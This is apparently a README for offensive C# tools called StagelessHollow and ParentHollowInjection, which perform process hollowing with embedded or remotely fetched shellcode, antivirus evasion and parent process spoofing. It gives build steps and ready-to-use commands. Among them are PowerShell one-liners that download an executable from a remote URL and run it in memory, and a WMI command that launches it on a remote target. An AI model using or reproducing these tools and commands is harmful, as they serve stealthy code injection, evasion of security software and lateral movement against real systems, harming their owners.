# StagelessHollow
These C# based executables perform the Process Hollowing injection technique, can hold- or remotely fetch base64 encoded shellcode, doesn't require any arguments to operate and have some additional AV heuristic bypass techniques baked in. Furthermore, the ParentProcessInjection tool performs the parent spoofing technique to further obfuscate its presence. 

### Prepare & compile tool:
<b>ParentHollowInjection:</b>
```
- 1. Open the tool's project file in Visual Studio.
- 2. Either add your own base64 encoded shellcode directly in the placeholder OR specify an URL to fetch the shellcode remotely.
- 3. Specify the path to a program location that will be launched and used to inject the shellcode into.
- 4. Specify the name of an already running process (e.g. explorer) which will serve as the parent process (parent process spoofing).
- 5. Build the project (don't forget to enable the "Allow unsafe code" option under "Properties > Build").
```

<b>HollowInjection:</b>
```
- 1. Open the tool's project file in Visual Studio
- 2. Either add your own base64 encoded shellcode directly in the placeholder OR specify an URL to fetch the shellcode remotely.
- 3. Either specify the path to a program location that will be launched and used to inject the shellcode into OR specify the path as an argument during execution of the tool (check usage below). 
- 4. Build the project (don't forget to enable the "Allow unsafe code" option under "Properties > Build").
```

### Usage examples:
<b>ParentHollowInjection:</b>

Load ParentHollowInjection.exe from remote location and execute in memory using PowerShell:
```
[System.Reflection.Assembly]::Load((New-Object Net.WebClient).DownloadData("https://<URL>/ParentHollowInjection.exe")); [ParentHollowInjection.Program]::Main(@())
```
After uploading ParentHollowInjection.exe to a target system, execute it remotely from disk:
```
Invoke-WmiMethod –ComputerName <FQDN target system> -Class win32_process -Name create -ArgumentList "C:\Windows\Temp\ParentHollowInjection.exe"
```

<b>HollowInjection:</b>

Run tool from disk with optional argument to specify the program that is used to inject the shellcode into:
```
C:\Windows\Temp\HollowInjection.exe [/program:C:\<path to program.exe>]
```
Load tool from remote location and execute in memory with the '/program:' argument specified:
```
[System.Reflection.Assembly]::Load((New-Object Net.WebClient).DownloadData("https://<URL>/HollowInjection.exe")); [HollowInjection.Program]::Main(@("/program:C:\Windows\System32\notepad.exe"))
```

### Credit & References:
The code in this project is <b>heavily</b> based on the [ProcessInjection](https://github.com/3xpl01tc0d3r/ProcessInjection) project which is based on the Process Hollowing code from [Aaron Bray](https://github.com/ambray) and [Rasta Mouse](https://github.com/rasta-mouse). 




